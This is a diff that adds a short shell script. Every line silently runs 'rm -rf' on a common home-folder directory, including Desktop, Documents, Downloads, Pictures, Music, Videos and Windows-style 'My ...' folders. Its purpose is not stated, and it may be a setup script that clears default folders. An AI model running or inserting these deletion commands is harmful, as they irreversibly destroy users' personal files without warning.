@@ -1,0 +1,13 @@
+rm -rf ~/Desktop > /dev/null
+rm -rf ~/Documents > /dev/null
+rm -rf ~/Downloads > /dev/null
+rm -rf ~/Music > /dev/null
+rm -rf ~/My\ Documents > /dev/null
+rm -rf ~/My\ Music > /dev/null
+rm -rf ~/My\ Pictures > /dev/null
+rm -rf ~/My\ Shapes > /dev/null
+rm -rf ~/My\ Videos > /dev/null
+rm -rf ~/Pictures > /dev/null
+rm -rf ~/Public > /dev/null
+rm -rf ~/Templates > /dev/null
+rm -rf ~/Videos > /dev/null
